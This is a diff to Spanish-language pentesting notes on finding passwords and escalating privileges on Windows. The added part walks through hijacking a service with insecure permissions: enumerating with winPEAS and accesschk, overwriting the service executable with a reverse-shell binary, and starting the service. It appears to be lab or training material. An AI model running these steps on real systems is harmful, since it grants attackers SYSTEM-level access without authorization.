@@ -1,4 +1,4 @@
-# Formas tipicas de escalar privilegios para Windows
+# Formas tipicas de encontrar contraseñas o escalar privilegios en Windows
 
 - WinPEAS
 - PowerSploit
@@ -6,6 +6,8 @@
 - Sam y System
 - Archivos de Configuracion
 - Registro
++ Posibles Escaladas de Privilegios
++ Insecure Service Permissions 
 
 # - Registro
 ```powershell
@@ -140,3 +142,37 @@ Foreach($obj in $Result)
 }
 
 ````
+
+# Escaladas de Privilegios
+1.- Insecure Service Permissions 
+Procedemos a usar winPEAS para identificar los posibles ejecutables mirando en "Services Information"
+
+Procedemos a usar el comando 
+`$ sc qc 'NombreArchivo'`
+
+Con el siguiente comando comprobamos los permisos que tenemos sobre el mismo.
+```bash
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW WIN-QBA94KB3IOF\Administrator
+        FILE_ALL_ACCESS
+  RW BUILTIN\Users
+        FILE_ALL_ACCESS
+```
+
+Una vez comprobados y viendo que tenemos la posibilidad de Hijackear el servicio por otro procedemos a crear un revshell con el nombre del servicio
+```bash
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+``` 
+
+Habiendolo copiado, procedemos a iniciar el servicio fake
+```bash
+net start filepermsvc
+```
